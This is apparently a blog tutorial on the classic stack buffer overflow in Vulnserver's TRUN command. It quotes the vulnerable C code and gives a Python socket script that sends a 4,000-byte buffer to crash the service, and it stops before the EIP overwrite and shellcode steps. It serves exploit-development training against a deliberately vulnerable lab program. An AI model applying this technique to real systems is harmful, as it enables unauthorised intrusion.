---
layout: single
title: Classic JMP ESP buffer overflow exploitation - remote overflow in Vulnserver
---

This post covers the beginning of any exploit developers journey, the classic buffer overflow exploitation. 

This post covers the exploitation of the Vulnererver TRUN command, utilizing a JMP ESP and EIP overwrite to obtain remote code execution on a system.

So what exactly is a buffer overflow vulnerability? A buffer overflow vulnerability is a software programming error that occurs commonly in C, and c++  applications when the software author uses insecure functions.  A buffer overflow vulnerability is where an input function is not validating the amount of user input that is given, which will allow a user to give too much the data that can then overwrite the buffer sized amount that is designated for the input, and start  writing data onto the stack.

The classic exploitation technique for a standard buffer overflow is to fill up the input buffer, and calculate exactly how much data you need to precisely place a JMP instruction within the EIP  memory register. The EIP memory register is responsible for pointing to the next address that is going to be executed, if the attacker can add a JMP instruction into this EIP register, they can have that JMP instruction point to a malicious payload, a malicious shellcode payload.

While auditing the source code for this application, you can see that the TRUN  command takes user input using the insecure strncpy function, this allows for an attacker to abuse the applications buffer overflow vulnerability.

```c
			} else if (strncmp(RecvBuf, "TRUN ", 5) == 0) {
				char *TrunBuf = malloc(3000);
				memset(TrunBuf, 0, 3000);
				for (i = 5; i < RecvBufLen; i++) {
					if ((char)RecvBuf[i] == '.') {
						strncpy(TrunBuf, RecvBuf, 3000);			// <------------	
						Function3(TrunBuf);
						break;
					}
				}
```

Start running the vulnserver application, make sure your firewall is configured to allow this local connection. 

![vulnserver 1]()

First a basic nc connection to the victim machine on port 9999 shows that Vulnserver is actively running.

![vulnserver 2]()

Use Immunity debugger and attach the running vulnserver application to it, this will allow you to monitor and fully get a grasp on the application being exploited.

![vulnserver 3]()

With the vulnserver application running on port 9999 on the victim host target, you can use a basic python socket connection in order to send data to this command.

```python
import socket

victim_host = "10.0.0.161"
port = 9999

payload = "A" * 4000
buffer_exploit = "TRUN /.:/" + payload

expl = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
expl.connect((victim_host, port))
expl.send(buffer_exploit)

print("[x] Sent TRUN + malicious payload to the victim")
print("[!] You may need to send it multiple times")
expl.close()
```
After you send the vulnerable application the buffer of A's, you can observe the application crashing. The overwritten registers show this is being successfully exploited.

![vulnserver 4]()

